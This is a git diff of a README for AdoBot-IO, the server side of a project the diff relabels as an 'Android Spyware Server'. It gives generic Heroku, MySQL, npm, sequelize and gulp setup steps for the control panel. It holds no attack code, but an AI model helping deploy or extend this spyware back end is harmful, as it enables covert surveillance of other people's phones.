@@ -1,5 +1,5 @@
 # AdoBot-IO
-[AdoBot](https://github.com/adonespitogo/AdoBot) NodeJS Server with socket.io
+[AdoBot](https://github.com/adonespitogo/AdoBot) Android Spyware Server
 
 
 # Server Setup
@@ -15,10 +15,10 @@
  - Click `Provision` when prompted
  
 ## Configure the app
- - Go to the settings tab of your new app
+ - Go to the settings tab of your new heroku app
  - Click `Reveal Config Vars` button
  - Copy the VALUE of `CLEARDB_DATABASE_URL` KEY
- - Create a new KEY named `DATABASE_URL` and the paste into the `VALUE` field the copied value of `CLEARDB_DATABASE_URL`. Click `ADD` to save.
+ - Create a new KEY named `DATABASE_URL` and the paste into the `VALUE` field the value from `CLEARDB_DATABASE_URL`. Click `ADD` to save.
  - Create a new KEY named `ADMIN_USERNAME` and the VALUE will be your desired username used to login into the panel later. Then click `ADD` button
  - Create a new KEY named `ADMIN_PASSWORD` and the VALUE will be your desired password used to login into the panel later. Then click `ADD` button
 
@@ -54,15 +54,20 @@ $ heroku open
 
 ## Setup
 
-Create `adobot` mysql schema/database.
-
-Edit `./config/config.json` to your preferences.
+Edit `./config/config.json` to your preferences. In the `development` section, change the username, password and name of the database. The `admin` section refers to the admin panel login credentials.
 
 Install dependencies:
 
 ```
-$ sudo npm install -g sequelize-cli gulp gulp-cli
 $ npm install
+```
+Populate the database:
+```
+$ ./node_modules/.bin/sequelize db:migrate
+```
+Build the frontend assets:
+```
+$ ./node_modules/.bin/gulp
 ```
 Run local server
 ```
